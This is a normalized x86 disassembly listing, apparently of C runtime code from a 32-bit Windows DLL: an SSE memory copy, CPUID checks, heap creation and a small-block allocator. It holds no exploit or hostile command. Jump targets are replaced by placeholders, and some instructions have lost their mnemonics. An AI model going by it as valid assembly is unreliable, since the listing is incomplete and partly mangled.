shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_10011d25
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_10011d25
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_10011c9e
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_10011e58
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_10011e08
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_10011ec7
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_10011ef7
cmp [ rw-data ] 0x3
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov edi [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call edi
pop edi
pop ebx
push esi
mov esi [ rw-data ]
add esi 0x10
push 0x8000
push 0x0
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push 0x0
push [ rw-data ]
call edi
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop esi
sub_10011f6b
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_10016a73
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_10011fb6
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_1000ced5
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_10012024
push 0xc
push r--data
call sub_1000ed24
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1001309c
push 0x1e
call sub_10012ef1
push 0xff
call sub_10012c62
push 0x18
call sub_10015a7d
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1000ecdb
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_1000ed69
retn
push edi
call sub_1000ced5
pop ecx
push 0xfa0
push edi
call sub_10016a73
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_1000ced5
pop ecx
call sub_1000ecdb
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100120de
mov eax [ ebp - 0x1c ]
sub_100120e7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_10012024
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_10012c0e
pop ecx
sub_1001211a
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_1001214a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_1000cb70
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_10012460
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_10012510
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_10012618
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_100128f9
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_10012510
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
